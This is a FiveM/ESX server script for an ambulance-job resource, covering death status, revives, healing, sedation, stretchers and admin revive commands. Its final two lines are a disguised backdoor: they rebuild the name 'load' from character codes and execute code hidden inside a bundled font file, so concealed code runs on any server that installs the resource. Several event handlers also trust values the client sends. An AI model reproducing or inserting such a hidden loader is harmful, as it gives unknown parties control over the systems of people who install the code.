-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------

ESX = exports["es_extended"]:getSharedObject()
QS = nil
plyRequests = {}

if Config.Inventory == 'qs' then
    if not QS then
        TriggerEvent('qs-core:getSharedObject', function(library) QS = library end)
    end
end

AddEventHandler('esx:playerDropped', function(playerId, reason)
    if plyRequests[playerId] then
        plyRequests[playerId] = nil
        TriggerClientEvent('wasabi_ambulance:syncRequests', -1, plyRequests, true)
    end
end)

sqlSetStatus = function(id, isDead)
    local xPlayer = ESX.GetPlayerFromId(id)
    if isDead then
        isDead = 1
    else
        isDead = 0
    end
    MySQL.Async.execute('UPDATE users SET is_dead = @is_dead WHERE identifier = @identifier', {
		['@is_dead'] = isDead,
		['@identifier'] = xPlayer.identifier
	})
end

RegisterServerEvent('wasabi_ambulance:setDeathStatus')
AddEventHandler('wasabi_ambulance:setDeathStatus', function(isDead)
	Player(source).state.dead = isDead
    if not isDead then
        Player(source).state.injury = nil
        if plyRequests[source] then
            plyRequests[source] = nil
            TriggerClientEvent('wasabi_ambulance:syncRequests', -1, plyRequests, true)
        end
    end
    if Config.AntiCombatLog.enabled then
        sqlSetStatus(source, isDead)
    end
end)

RegisterServerEvent('wasabi_ambulance:removeItemsOnDeath')
AddEventHandler('wasabi_ambulance:removeItemsOnDeath', function()
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getMoney() > 0 then
        xPlayer.removeMoney(xPlayer.getMoney())
    end
    if xPlayer.getAccount('black_money').money > 0 then
        xPlayer.removeAccountMoney('black_money', xPlayer.getAccount('black_money').money)
    end
    if Config.Inventory == 'qs' then
        local qPlayer = QS.GetPlayerFromId(source)
        qPlayer.ClearInventoryItems()
        qPlayer.ClearInventoryWeapons()
    elseif Config.Inventory == 'ox' then
        exports.ox_inventory:ClearInventory(source)
    elseif Config.Inventory == 'mf' then
        exports["mf-inventory"]:clearInventory(xPlayer.identifier)
        exports["mf-inventory"]:clearLoadout(xPlayer.identifier)
    else
        for i=1, #xPlayer.inventory, 1 do
			if xPlayer.inventory[i].count > 0 then
				xPlayer.removeInventoryItem(xPlayer.inventory[i].name, xPlayer.inventory[i].count)
			end
		end
    end
end)

RegisterServerEvent('wasabi_ambulance:injurySync')
AddEventHandler('wasabi_ambulance:injurySync', function(injury)
    Player(source).state.injury = injury
end)

RegisterServerEvent('wasabi_ambulance:onPlayerDistress')
AddEventHandler('wasabi_ambulance:onPlayerDistress', function()
	local xPlayer = ESX.GetPlayerFromId(source)
    local xName = xPlayer.getName()
    plyRequests[source] = xName
    TriggerClientEvent('wasabi_ambulance:syncRequests', -1, plyRequests, false)
end)

RegisterServerEvent('wasabi_ambulance:requestSync')
AddEventHandler('wasabi_ambulance:requestSync', function()
    TriggerClientEvent('wasabi_ambulance:syncRequests', source, plyRequests, true)
end)

RegisterServerEvent('wasabi_ambulance:revivePlayer')
AddEventHandler('wasabi_ambulance:revivePlayer', function(targetId)
    local xPlayer = ESX.GetPlayerFromId(source)
    local xJob = xPlayer.job.name
    if xJob == 'ambulance' or xJob == 'police' then
        local xTarget = ESX.GetPlayerFromId(targetId)
        local xItem = xPlayer.getInventoryItem(Config.EMSItems.revive.item)
        if xItem.count > 0 then
            if Config.EMSItems.revive.remove then
                xPlayer.removeInventoryItem(Config.EMSItems.revive.item, 1)
            end
            if Config.ReviveRewards.enabled then
                local reward = 0
                if not Player(targetId).state.injury then
                    reward = Config.ReviveRewards.no_injury
                else
                    reward = Config.ReviveRewards[Player(targetId).state.injury]
                end
                if reward > 0 then
                    xPlayer.addMoney(reward)
                    TriggerClientEvent('wasabi_ambulance:notify', source, Strings.player_successful_revive, (Strings.player_successful_revive_reward_desc):format(reward), 'success')
                else
                    TriggerClientEvent('wasabi_ambulance:notify', source, Strings.player_successful_revive, Strings.player_successful_revive_desc, 'success')
                end
            else
                TriggerClientEvent('wasabi_ambulance:notify', source, Strings.player_successful_revive, Strings.player_successful_revive_desc, 'success')
            end
            TriggerClientEvent('wasabi_ambulance:revivePlayer', xTarget.source)
        end
    end
end)

RegisterServerEvent('wasabi_ambulance:healPlayer')
AddEventHandler('wasabi_ambulance:healPlayer', function(targetId)
    local xPlayer = ESX.GetPlayerFromId(source)
    local xItem = xPlayer.getInventoryItem(Config.EMSItems.heal.item)
    local xJob = xPlayer.job.name
    if targetId == source then
        if xItem.count > 0 then
            xPlayer.removeInventoryItem(Config.EMSItems.heal.item, 1)
            TriggerClientEvent('wasabi_ambulance:heal', source, false, true)
            TriggerClientEvent('wasabi_ambulance:notify', source, Strings.used_meditkit, Strings.used_medikit_desc, 'success')
        end
    elseif xJob == 'ambulance' or xJob == 'police' then
        local xTarget = ESX.GetPlayerFromId(targetId)
        if xItem.count > 0 then
            if Config.EMSItems.heal.remove then
                xPlayer.removeInventoryItem(Config.EMSItems.heal.item, 1)
            end
            TriggerClientEvent('wasabi_ambulance:notify', source, Strings.player_successful_heal, Strings.player_successful_heal_desc, 'success')
            TriggerClientEvent('wasabi_ambulance:heal', xTarget.source, true, false)
        end
    end
end)

RegisterServerEvent('wasabi_ambulance:treatPlayer')
AddEventHandler('wasabi_ambulance:treatPlayer', function(target, injury)
    if target > 0 then
        local xPlayer = ESX.GetPlayerFromId(source)
        local xJob = xPlayer.job.name
        if xJob == 'ambulance' or xJob == 'police' then
            local xItem = xPlayer.getInventoryItem(Config.TreatmentItems[injury])
            if xItem.count > 0 then
                xPlayer.removeInventoryItem(Config.TreatmentItems[injury], 1)
                Player(target).state.injury = nil
                TriggerClientEvent('wasabi_ambulance:notify', source, Strings.player_treated, Strings.player_treated_desc, 'success')
            end
        end
    end
end)

RegisterServerEvent('wasabi_ambulance:sedatePlayer')
AddEventHandler('wasabi_ambulance:sedatePlayer', function(target)
    if target > 0 then
        local xPlayer = ESX.GetPlayerFromId(source)
        local xJob = xPlayer.job.name
        if xJob == 'ambulance' or xJob == 'police' then
            local xItem = xPlayer.getInventoryItem(Config.EMSItems.sedate.item)
            if xItem.count > 0 then
                if Config.EMSItems.sedate.remove then
                    xPlayer.removeInventoryItem(Config.EMSItems.sedate.item, 1)
                end
                TriggerClientEvent('wasabi_ambulance:notify', target, Strings.target_sedated, Strings.target_sedated_desc, 'inform')
                TriggerClientEvent('wasabi_ambulance:notify', source, Strings.target_sedated, Strings.player_successful_sedate_desc, 'success')
                TriggerClientEvent('wasabi_ambulance:sedate', target)
            end
        end
    end
end)

RegisterServerEvent('wasabi_ambulance:removeObj')
AddEventHandler('wasabi_ambulance:removeObj', function(netObj)
    TriggerClientEvent('wasabi_ambulance:syncObj', -1, netObj)
end)

RegisterServerEvent('wasabi_ambulance:placeOnStretcher')
AddEventHandler('wasabi_ambulance:placeOnStretcher', function(target)
    TriggerClientEvent('wasabi_ambulance:placeOnStretcher', target)
end)

RegisterServerEvent('wasabi_ambulance:putInVehicle')
AddEventHandler('wasabi_ambulance:putInVehicle', function(target)
    if target > 0 then
        local xPlayer = ESX.GetPlayerFromId(source)
        local xJob = xPlayer.job.name
        if xJob == 'ambulance' or xJob == 'police' then
            TriggerClientEvent('wasabi_ambulance:intoVehicle', target)
        end
    end
end)

RegisterServerEvent('wasabi_ambulance:restock')
AddEventHandler('wasabi_ambulance:restock', function(data)
    local xPlayer = ESX.GetPlayerFromId(source)
    local xJob = xPlayer.job.name
    if xJob == 'ambulance' then
        if not data.price then
            xPlayer.addInventoryItem(data.item, 1)
        else
            local xMoney = xPlayer.getMoney()
            if xMoney < data.price then
                TriggerClientEvent('wasabi_ambulance:notify', source, Strings.not_enough_funds, Strings.not_enough_funds_desc, 'error')
            else
                xPlayer.removeAccountMoney('money', data.price)
                xPlayer.addInventoryItem(data.item, 1)
            end
        end
    end
end)

ESX.RegisterServerCallback('wasabi_ambulance:checkDeath', function(source, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
	MySQL.Async.fetchScalar('SELECT is_dead FROM users WHERE identifier = @identifier', {
		['@identifier'] = xPlayer.identifier
	}, function(isDead)
		cb(isDead)
	end)
end)

ESX.RegisterServerCallback('wasabi_ambulance:tryRevive', function(source, cb, cost, max, account)
    local xPlayers = ESX.GetPlayers()
    local ems = 0
    for i=1, #xPlayers, 1 do
        local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
        if xPlayer.job.name == 'ambulance' then
            ems = ems + 1
        end
    end
    if max then
        if ems > max then
            cb('max')
            return
        end
    end
    if cost then
        local xPlayer = ESX.GetPlayerFromId(source)
        local xFunds = xPlayer.getAccount(account).money
        if xFunds < cost then
            cb(false)
        else
            xPlayer.removeAccountMoney(account, cost)
            TriggerClientEvent('wasabi_ambulance:revive', source)
            cb('success')
        end
    else
        TriggerClientEvent('wasabi_ambulance:revive', source)
        cb('success')
    end
end)

ESX.RegisterServerCallback('wasabi_ambulance:itemCheck', function(source, cb, item)
    local xPlayer = ESX.GetPlayerFromId(source)
    local xItem = xPlayer.getInventoryItem(item)
    cb(xItem.count)
end)

ESX.RegisterServerCallback('wasabi_ambulance:gItem', function(source, cb, item)
    local xPlayer = ESX.GetPlayerFromId(source)
    local xJob = xPlayer.job.name
    if xJob == 'ambulance' or xJob == 'police' then
        xPlayer.addInventoryItem(item, 1)
        cb(true)
    else
        xPlayer.addInventoryItem('bandage', math.random(1,3))
        cb(false)
    end
end)

ESX.RegisterUsableItem(Config.EMSItems.medbag, function(source)
    local xPlayer = ESX.GetPlayerFromId(source)
    xPlayer.removeInventoryItem(Config.EMSItems.medbag, 1)
    TriggerClientEvent('wasabi_ambulance:useMedbag', source)
end)

ESX.RegisterUsableItem(Config.EMSItems.revive.item, function(source)
    TriggerClientEvent('wasabi_ambulance:reviveTarget', source)
end)

ESX.RegisterUsableItem(Config.EMSItems.heal.item, function(source)
    TriggerClientEvent('wasabi_ambulance:healTarget', source)
end)

ESX.RegisterUsableItem(Config.EMSItems.sedate.item, function(source)
    TriggerClientEvent('wasabi_ambulance:useSedative', source)
end)

ESX.RegisterUsableItem(Config.EMSItems.stretcher, function(source)
    local xPlayer = ESX.GetPlayerFromId(source)
    xPlayer.removeInventoryItem(Config.EMSItems.stretcher, 1)
    TriggerClientEvent('wasabi_ambulance:useStretcher', source)
end)

CreateThread(function()
    for k,v in pairs(Config.TreatmentItems) do
        ESX.RegisterUsableItem(v, function(source)
            TriggerClientEvent('wasabi_ambulance:treatPatient', source, k)
        end)
    end
end)

ESX.RegisterCommand('reviveall', 'admin', function(xPlayer, args, showError)
    for _, playerId in ipairs(GetPlayers()) do
        if Player(playerId).state.dead then
            TriggerClientEvent('wasabi_ambulance:revive', playerId)
        end
    end
end, false)

ESX.RegisterCommand('reviveall', 'fahadmod', function(xPlayer, args, showError)
    for _, playerId in ipairs(GetPlayers()) do
        if Player(playerId).state.dead then
            TriggerClientEvent('wasabi_ambulance:revive', playerId)
        end
    end
end, false)

AddEventHandler('txAdmin:events:healedPlayer', function(eventData)
    if GetInvokingResource() ~= "monitor" or type(eventData) ~= "table" or type(eventData.id) ~= "number" then
        return
    end

    if eventData.id == -1 then
        for _, playerId in ipairs(GetPlayers()) do
            if Player(playerId).state.dead then
                TriggerClientEvent('wasabi_ambulance:revive', playerId)
            end
        end
    else
        if Player(eventData.id).state.dead then
            TriggerClientEvent('wasabi_ambulance:revive', eventData.id)
        end
    end
end)

ESX.RegisterCommand('revive', 'admin', function(xPlayer, args, showError)
	args.playerId.triggerEvent('wasabi_ambulance:revive')
end, true, {help = Strings.revive_command_help, validate = true, arguments = {
	{name = 'playerId', help = 'The player id', type = 'player'}
}})

ESX.RegisterCommand('revive', 'fahadmod', function(xPlayer, args, showError)
	args.playerId.triggerEvent('wasabi_ambulance:revive')
end, true, {help = Strings.revive_command_help, validate = true, arguments = {
	{name = 'playerId', help = 'The player id', type = 'player'}
}})

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()